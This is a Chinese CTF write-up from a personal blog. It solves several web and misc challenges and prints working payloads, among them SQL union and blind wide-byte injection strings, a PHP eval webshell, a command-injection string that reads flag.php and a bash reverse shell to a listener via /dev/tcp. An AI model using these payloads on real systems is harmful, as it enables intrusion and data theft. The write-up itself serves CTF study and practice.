title=\"W2-web2\"></a>W2-web2</h3><p>首先看源代码有个upload.php,但是只能上传jpg，gif，png的格式，url上的file能包含文件进来，但是禁止了php伪协议所以不能读取文件，思路是上传php马然后file包含进来，但是<code>&lt;!--?php</code>和<code>?--&gt;</code>被过滤了<br><img src=\"/img/2019-04-19/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>payload如下<br><pre><code class=\"hljs php\">&lt;script language=<span class=\"hljs-string\">\"PHP\"</span>&gt;\n@<span class=\"hljs-keyword\">eval</span>($_POST[<span class=\"hljs-string\">'a'</span>]);\n&lt;/script&gt;</code></pre></p>\n<p>然后菜刀连上去即可拿到flag：CTF{uP104D_1nclud3_426fh8_is_Fun}</p>\n<h3 id=\"W2-web3\"><a href=\"#W2-web3\" class=\"headerlink\" title=\"W2-web3\"></a>W2-web3</h3><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">\"flag.php\"</span>);\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'a'</span>])) &#123; \n <span class=\"hljs-keyword\">if</span> (strcmp($_GET[<span class=\"hljs-string\">'a'</span>], $flag) == <span class=\"hljs-number\">0</span>) \n <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">'Flag: '</span>.$flag); \n <span class=\"hljs-keyword\">else</span> \n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'close to flag'</span>;&#125;\n<span class=\"hljs-keyword\">else</span>&#123;\n show_source(<span class=\"hljs-keyword\">__FILE__</span>);\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>strcmp的问题，看这里–&gt;<a href=\"http://www.am0s.com/ctf/128.html\" target=\"_blank\" rel=\"noopener\">传送门</a>,payload如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">a[]</span>=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>flag:CTF{php_trcmp_problems}</p>\n<h3 id=\"W2-web4\"><a href=\"#W2-web4\" class=\"headerlink\" title=\"W2-web4\"></a>W2-web4</h3><pre><code class=\"hljs php\">show_source(<span class=\"hljs-keyword\">__FILE__</span>);\n$username= <span class=\"hljs-string\">\"this_is_secret\"</span>; \n$password= <span class=\"hljs-string\">\"this_is_not_known_to_you\"</span>; \n<span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">\"flag.php\"</span>);<span class=\"hljs-comment\">//here I changed those two </span>\n$info = <span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'info'</span>])? $_GET[<span class=\"hljs-string\">'info'</span>]: <span class=\"hljs-string\">\"\"</span> ;\n$data_unserialize = unserialize($info);\n<span class=\"hljs-keyword\">if</span> ($data_unserialize[<span class=\"hljs-string\">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class=\"hljs-string\">'password'</span>]==$password)&#123;\n <span class=\"hljs-keyword\">echo</span> $flag;\n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"username or password error!\"</span>;\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>构造数组绕过<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">Array</span>\n(\n [username] =&gt; <span class=\"hljs-number\">1</span>\n [password] =&gt; <span class=\"hljs-number\">1</span>\n)\n<span class=\"hljs-comment\">//序列化后的结果</span>\n<span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-pseudo\">:2</span>:&#123;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"username\"</span>;<span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">1</span>;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"password\"</span>;<span class=\"hljs-attribute\">b</span>:<span class=\"hljs-number\">1</span>;&#125;</code></pre></p>\n<p>flag:CTF{this_is_flag}</p>\n<h3 id=\"W2-web5\"><a href=\"#W2-web5\" class=\"headerlink\" title=\"W2-web5\"></a>W2-web5</h3><p><img src=\"/img/2019-04-19/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>在1秒后，3秒内正确提交20次即可<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#-*-coding:utf-8</span>\n<span class=\"hljs-keyword\">from</span> selenium.webdriver <span class=\"hljs-keyword\">import</span> Chrome\n<span class=\"hljs-keyword\">from</span> selenium.webdriver.common.by <span class=\"hljs-keyword\">import</span> By\n<span class=\"hljs-keyword\">from</span> selenium.webdriver.support.ui <span class=\"hljs-keyword\">import</span> WebDriverWait\n<span class=\"hljs-keyword\">from</span> selenium.webdriver.support <span class=\"hljs-keyword\">import</span> expected_conditions <span class=\"hljs-keyword\">as</span> EC\n<span class=\"hljs-keyword\">import</span> time\ndriver=Chrome(executable_path=<span class=\"hljs-string\">\"D:\\\\Python27\\\\chromedriver.exe\"</span>)\nlogin_url=<span class=\"hljs-string\">\"http://39.98.216.116:32795/\"</span>\ndriver.get(login_url)\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">20</span>):\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'&lt;--test%d--&gt;'</span>%i\n    list1 = driver.find_elements_by_tag_name(<span class=\"hljs-string\">'div'</span>)\n    tmp = <span class=\"hljs-string\">''</span>\n    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> list1:\n        tmp += i.text\n    tmp = tmp[:<span class=\"hljs-number\">-1</span>]\n    <span class=\"hljs-keyword\">print</span> tmp\n    tmp = <span class=\"hljs-string\">'res = '</span>+tmp\n    exec(tmp)\n    <span class=\"hljs-keyword\">print</span> res\n    list2 = driver.find_elements_by_tag_name(<span class=\"hljs-string\">\"input\"</span>)\n    list2[<span class=\"hljs-number\">0</span>].send_keys(res)\n    time.sleep(<span class=\"hljs-number\">1</span>)\n    list2[<span class=\"hljs-number\">1</span>].click()</code></pre></p>\n<p>flag:ctf{gr3At_cAcu1a7or}</p>\n<h3 id=\"W3-web1\"><a href=\"#W3-web1\" class=\"headerlink\" title=\"W3-web1\"></a>W3-web1</h3><p>在响应头的hint可以看到index.php的源码<br><img src=\"/img/2019-04-19/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n$info = <span class=\"hljs-string\">\"\"</span>; \n$req = [];\n$flag=<span class=\"hljs-string\">\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"</span>;\nini_set(<span class=\"hljs-string\">\"display_error\"</span>, <span class=\"hljs-keyword\">false</span>); \nerror_reporting(<span class=\"hljs-number\">0</span>); \n<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'number'</span>]))&#123;\n   header(<span class=\"hljs-string\">\"hint:source.txt\"</span>);\n   <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"have a fun!!\"</span>); \n&#125;\n<span class=\"hljs-keyword\">foreach</span>([$_GET, $_POST] <span class=\"hljs-keyword\">as</span> $global_var) &#123; \n    <span class=\"hljs-keyword\">foreach</span>($global_var <span class=\"hljs-keyword\">as</span> $key =&gt; $value) &#123; \n        $value = trim($value); \n        is_string($value) &amp;&amp; $req[$key] = addslashes($value); \n    &#125; \n&#125; \n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_palindrome_number</span><span class=\"hljs-params\">($number)</span> </span>&#123; \n    $number = strval($number); \n    $i = <span class=\"hljs-number\">0</span>; \n    $j = strlen($number) - <span class=\"hljs-number\">1</span>; \n    <span class=\"hljs-keyword\">while</span>($i &lt; $j) &#123; \n        <span class=\"hljs-keyword\">if</span>($number[$i] !== $number[$j]) &#123; \n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>; \n        &#125; \n        $i++; \n        $j--; \n    &#125; \n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">true</span>; \n&#125;\n<span class=\"hljs-keyword\">if</span>(is_numeric($_REQUEST[<span class=\"hljs-string\">'number'</span>]))&#123;\n\n   $info=<span class=\"hljs-string\">\"sorry, you cann't input a number!\"</span>;\n&#125;<span class=\"hljs-keyword\">elseif</span>($req[<span class=\"hljs-string\">'number'</span>]!=strval(intval($req[<span class=\"hljs-string\">'number'</span>])))&#123;\n     $info = <span class=\"hljs-string\">\"number must be equal to it's integer!! \"</span>;  \n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n     $value1 = intval($req[<span class=\"hljs-string\">\"number\"</span>]);\n     $value2 = intval(strrev($req[<span class=\"hljs-string\">\"number\"</span>]));  \n     <span class=\"hljs-keyword\">if</span>($value1!=$value2)&#123;\n          $info=<span class=\"hljs-string\">\"no, this is not a palindrome number!\"</span>;\n     &#125;<span class=\"hljs-keyword\">else</span>&#123;\n          \n          <span class=\"hljs-keyword\">if</span>(is_palindrome_number($req[<span class=\"hljs-string\">\"number\"</span>]))&#123;\n              $info = <span class=\"hljs-string\">\"nice! &#123;$value1&#125; is a palindrome number!\"</span>; \n          &#125;<span class=\"hljs-keyword\">else</span>&#123;\n             $info=$flag;\n          &#125;\n     &#125;\n&#125;\n<span class=\"hljs-keyword\">echo</span> $info;</code></pre></p>\n<p>拿到flag的条件是</p>\n<ol>\n<li>不为空，切不能是一个数值型数字，包括小数（由is_numeric函数判断）。</li>\n<li>不能是一个回文数（is_palindrome_number判断）。</li>\n<li>该数的反转的整数值应该和它本身的整数值相等。<br>目前已知的两种解法是</li>\n<li>利用intval函数溢出绕过</li>\n<li>用科学计数法构造0=0<br>用第二种方法构造的payload如下<pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">number</span>=<span class=\"hljs-number\">0</span>e-<span class=\"hljs-number\">0</span>%<span class=\"hljs-number\">00</span></code></pre>\n</li>\n</ol>\n<p>flag:CTF{b72dd89e71108245fe21a4c1849ae668}<br>参考–&gt;<a href=\"http://www.xianxianlabs.com/2018/07/07/%E5%AE%9E%E9%AA%8C%E5%90%A7-ctf-%E9%A2%98%E7%9B%AE%E4%B9%8B-web-writeup-%E9%80%9A%E5%85%B3%E5%A4%A7%E5%85%A8-1/\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h3 id=\"W3-web2\"><a href=\"#W3-web2\" class=\"headerlink\" title=\"W3-web2\"></a>W3-web2</h3><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">\"flag.php\"</span>;\nerror_reporting(<span class=\"hljs-number\">0</span>);\nshow_source(<span class=\"hljs-keyword\">__FILE__</span>);\n\n$a = @$_REQUEST[<span class=\"hljs-string\">'hello'</span>];\n<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"var_dump($a);\"</span>);</code></pre>\n<p>php注入，payload如下<br><pre><code class=\"hljs undefined\">);echo%<span class=\"hljs-number\">20</span>`cat%<span class=\"hljs-number\">20.</span>/flag.php`;<span class=\"hljs-comment\">//</span></code></pre></p>\n<p>flag:flag{92853051ab894a64f7865cf3c2128b34}</p>\n<h3 id=\"W3-web5\"><a href=\"#W3-web5\" class=\"headerlink\" title=\"W3-web5\"></a>W3-web5</h3><p><img src=\"/img/2019-04-19/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>这道题是bugku上的一道注入题，没有过滤，payload如下<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,group_concat(table_name) <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-built_in\">tables</span> <span class=\"hljs-built_in\">where</span> table_schema = database()#\nid=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,group_concat(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-built_in\">where</span> table_name = 'fl4g'#\nid=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,(<span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> fl4g)#</code></pre></p>\n<p><img src=\"/img/2019-04-19/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>flag:CTF{Sql_INJECT0N_4813drd8hz4}</p>\n<h3 id=\"W3-web3\"><a href=\"#W3-web3\" class=\"headerlink\" title=\"W3-web3\"></a>W3-web3</h3><p>查看源代码可以看到页面设置了<code>&lt;html lang=&quot;en&quot;&gt;</code>，可能存在宽字节注入<br><img src=\"/img/2019-04-19/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br>登录框过滤了<code>空格</code>，<code>=</code>，<code>and</code>，但是<code>or</code>，<code>&lt;</code>,<code>&gt;</code>,<code>&#39;</code>,<code>select</code>都没有过滤，同时用户名正确时只会显示password error<br>构造测试payload<br><pre><code class=\"hljs undefined\">username=admin%df%<span class=\"hljs-number\">27</span>or'<span class=\"hljs-number\">1</span>'&gt;'<span class=\"hljs-number\">1</span>&amp;password=<span class=\"hljs-number\">1</span>\nusername=admin%df%<span class=\"hljs-number\">27</span>or'<span class=\"hljs-number\">2</span>'&gt;'<span class=\"hljs-number\">1</span>&amp;password=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>再替换位置<br><pre><code class=\"hljs undefined\">username=admin<span class=\"hljs-symbol\">%df</span><span class=\"hljs-symbol\">%27</span><span class=\"hljs-keyword\">or</span>(<span class=\"hljs-keyword\">select</span>(password))&gt;'<span class=\"hljs-number\">0</span>&amp;password=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>不断变大后面的字符串就得到密码的md5值51b7a76d51e70b419f60d3473fb6f900，解密得到skctf123456，然后登录拿到flag<br><img src=\"/img/2019-04-19/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>flag：CTF{b1iNd_SQL_iNJEcti0n!}</p>\n<h3 id=\"W3-web\"><a href=\"#W3-web\" class=\"headerlink\" title=\"W3-web\"></a>W3-web</h3><p><img src=\"/img/2019-04-19/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>cbc字节翻转攻击，首先扫描得到源码的备份文件<code>.index.php.swp</code><br><pre><code class=\"hljs php\">     $_SESSION[<span class=\"hljs-string\">'username'</span>] = $info[<span class=\"hljs-string\">'username'</span>];\n        &#125;<span class=\"hljs-keyword\">else</span>&#123;\n            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"ERROR!\"</span>);\n        &#125;\n    &#125;\n&#125;\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">show_homepage</span><span class=\"hljs-params\">()</span></span>&#123;\n    <span class=\"hljs-keyword\">if</span> ($_SESSION[<span class=\"hljs-string\">\"username\"</span>]===<span class=\"hljs-string\">'admin'</span>)&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;\n    &#125;<span class=\"hljs-keyword\">else</span>&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;hello '</span>.$_SESSION[<span class=\"hljs-string\">'username'</span>].<span class=\"hljs-string\">'&lt;/p&gt;'</span>;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;\n    &#125;\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;\n&#125;\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($_POST[<span class=\"hljs-string\">'username'</span>]) &amp;&amp; <span class=\"hljs-keyword\">isset</span>($_POST[<span class=\"hljs-string\">'password'</span>]))&#123;\n    $username = (string)$_POST[<span class=\"hljs-string\">'username'</span>];\n    $password = (string)$_POST[<span class=\"hljs-string\">'password'</span>];\n    <span class=\"hljs-keyword\">if</span>($username === <span class=\"hljs-string\">'admin'</span>)&#123;\n        <span class=\"hljs-keyword\">exit</span>(<span class=\"hljs-string\">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);\n    &#125;<span class=\"hljs-keyword\">else</span>&#123;\n        $info = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'username'</span>=&gt;$username,<span class=\"hljs-string\">'password'</span>=&gt;$password);\n        login($info);\n        show_homepage();\n    &#125;\n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($_SESSION[<span class=\"hljs-string\">\"username\"</span>]))&#123;\n        check_login();\n        show_homepage();\n    &#125;<span class=\"hljs-keyword\">else</span>&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'&lt;body class=\"login-body\"&gt;\n                &lt;div id=\"wrapper\"&gt;\n                    &lt;div class=\"user-icon\"&gt;&lt;/div&gt;\n                    &lt;div class=\"pass-icon\"&gt;&lt;/div&gt;\n                    &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt;\n                        &lt;div class=\"header\"&gt;\n                        &lt;h1&gt;Login Form&lt;/h1&gt;\n                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;\n                        &lt;/div&gt;\n                        &lt;div class=\"content\"&gt;\n                        &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt;\n                        &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt;\n                        &lt;/div&gt;\n                        &lt;div class=\"footer\"&gt;\n                        &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt;\n                        &lt;/div&gt;\n                    &lt;/form&gt;\n                &lt;/div&gt;\n            &lt;/body&gt;'</span>;\n    &#125;\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>admin被禁止登录，但是我们可以利用反序列化漏洞重置<code>$_SESSION[&#39;username&#39;]为admin</code><br>cbc翻转攻击具体可以看师兄的博客–&gt;<a href=\"https://delcoding.github.io/2018/03/bugku-writeup4/\" target=\"_blank\" rel=\"noopener\">传送门</a><br>flag：SKCTF{CBC_wEB_cryptography_6646dfgdg6}</p>\n<h3 id=\"W3-misc3\"><a href=\"#W3-misc3\" class=\"headerlink\" title=\"W3-misc3\"></a>W3-misc3</h3><p>下载回来的pdf是经过加密的，加密方法是rot13<br>解密方法<br><pre><code class=\"hljs bash\">cat MinionQuest.pdf | tr <span class=\"hljs-string\">'A-Za-z'</span> <span class=\"hljs-string\">'N-ZA-Mn-za-m'</span> &gt; out.pdf</code></pre></p>\n<p><img src=\"/img/2019-04-19/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>解密后的pdf有部分被挡住了，用下面的命令提取pdf的图片<br><pre><code class=\"hljs bash\">pdfimages -png result.pdf images</code></pre></p>\n<p>得到完整的图片<br><img src=\"/img/2019-04-19/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>flag:BITSCTF{save_the_kid}<br>参考–&gt;<a href=\"https://sixfoisneuf.fr/ctf/hacking/english/writeup/2017/02/06/bitsctf-writeup/\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h3 id=\"W3-misc1\"><a href=\"#W3-misc1\" class=\"headerlink\" title=\"W3-misc1\"></a>W3-misc1</h3><p>下载回来是一个usb流量包，在某一条长度比较大的流量里发现了一张图片<br><img src=\"/img/2019-04-19/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>dump出来就可以得到flag，微软照片的bug导致我卡了n个小时，<strong>上面sublime，下面微软的照片</strong><br><img src=\"/img/2019-04-19/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"></p>\n<h3 id=\"W3-misc5\"><a href=\"#W3-misc5\" class=\"headerlink\" title=\"W3-misc5\"></a>W3-misc5</h3><p>参考–&gt;<a href=\"https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/Mysterious-GIF\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>都是些旧题，加深印象。<br>","more":"</p>\n<h3 id=\"W2-web1\"><a href=\"#W2-web1\" class=\"headerlink\" title=\"W2-web1\"></a>W2-web1</h3><p>这个是bugku上的login2，在响应头可以看到tip<br><img src=\"/img/2019-04-19/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>解码出来是<br><pre><code class=\"hljs php\">$sql=<span class=\"hljs-string\">\"SELECT username,password FROM admin WHERE username='\"</span>.$username.<span class=\"hljs-string\">\"'\"</span>;\n<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>($row) &amp;&amp; $row[<span class=\"hljs-string\">'password'</span>]===md5($password))&#123;\n&#125;</code></pre></p>\n<p>构造payload<br><pre><code class=\"hljs undefined\">username=<span class=\"hljs-number\">1</span>' union select md5(<span class=\"hljs-number\">1</span>),md5(<span class=\"hljs-number\">1</span>)#&amp;password=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>即可登录成功，登陆成功后可以看到一个命令执行框，反弹个shell即可<br><img src=\"/img/2019-04-19/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>主机执行<br><pre><code class=\"hljs bash\">nc -lvvp port</code></pre></p>\n<p>然后执行<br><pre><code class=\"hljs bash\">|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre></p>\n<p>flag：SKCTF{Uni0n_@nd_c0mM4nD_exEc}</p>\n<h3 id=\"W2-web2\"><a href=\"#W2-web2\" class=\"headerlink\" title=\"W2-web2\"></a>W2-web2</h3><p>首先看源代码有个upload.php,但是只能上传jpg，gif，png的格式，url上的file能包含文件进来，但是禁止了php伪协议所以不能读取文件，思路是上传php马然后file包含进来，但是<code>&lt;!--?php</code>和<code>?--&gt;</code>被过滤了<br><img src=\"/img/2019-04-19/4.png\" srcset=\"/img/static/loading.gif\" 